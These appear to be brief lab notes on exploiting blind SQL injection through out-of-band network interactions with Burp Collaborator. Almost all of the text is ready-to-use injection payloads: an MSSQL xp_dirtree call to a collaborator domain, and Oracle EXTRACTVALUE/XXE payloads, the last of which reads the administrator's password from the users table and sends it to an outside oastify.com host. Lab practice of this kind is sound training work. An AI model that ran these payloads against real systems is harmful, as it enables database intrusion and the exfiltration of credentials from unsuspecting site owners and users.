"""
exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control.

Burp Collaborator is a server that provides custom implementations of various network services, including DNS,smtp,http.

 It allows you to detect when network interactions occur as a result of sending individual payloads to a vulnerable application.

 '; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--




 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--

 ogntsmqhhtybnclndcoeg8uc0pay8cxwp.oast.fun



 '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http://bwbimcqaj7oienetdibwlxslwc23qtei.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--

 
 
 
 
'+UNION+SELECT+EXTRACTVALUE(
xmltype(
'<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://'||
(SELECT password FROM users WHERE username='administrator')||
'.v623ccjcre1b8op6407fgwzc93fu3lra.oastify.com/">
%remote;]>'
),'/l')+FROM dual--
 
 """